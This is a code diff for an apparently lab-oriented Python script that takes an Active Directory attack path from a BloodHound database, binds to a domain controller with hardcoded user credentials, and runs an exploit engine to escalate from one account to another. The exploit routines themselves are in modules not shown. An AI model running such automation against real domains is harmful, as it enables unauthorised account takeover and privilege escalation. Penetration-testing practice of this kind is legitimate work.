@@ -4,22 +4,28 @@ from core.exploit import ExploitEngine
 from core.task_manager import TaskManager
 from ldap3 import Server, Connection, ALL
 
+# CONFIGURATION
+DC_IP = "172.16.5.5"
+DOMAIN = "INLANEFREIGHT.LOCAL"
+SOURCE_USER = "INLANEFREIGHT\\WLEY"
+SOURCE_PASS = "transporter@4"
+
 # 1. Find the Path (Neo4j)
 db = DatabaseManager("bolt://localhost:7687", "neo4j", "bloodhoundcommunityedition")
 db.connect()
 pf = Pathfinder(db)
 path = pf.find_best_path("WLEY@INLANEFREIGHT.LOCAL", "ADUNN@INLANEFREIGHT.LOCAL")
 
-# 2. Initialize Exploitation (LDAP)
-server = Server('172.16.5.5', use_ssl=True, get_info=ALL)
-conn = Connection(server, user='INLANEFREIGHT\\WLEY', password='transporter@4', auto_bind=True)
+server = Server(DC_IP, use_ssl=True, get_info=ALL)
+conn = Connection(server, user=SOURCE_USER, password=SOURCE_PASS, auto_bind=True)
 
-# 3. Map and Execute
-engine = ExploitEngine(conn)
+# 2. Initialize Engine with Config
+engine = ExploitEngine(conn, domain=DOMAIN, dc_ip=DC_IP)
+
+# 3. Initialize Task Manager with Initial Password
 tm = TaskManager(engine)
+tm.set_initial_password(SOURCE_PASS)
 
+# 4. Run
 tm.build_plan(path)
 tm.execute_all()
-
-db.close()
-conn.unbind()
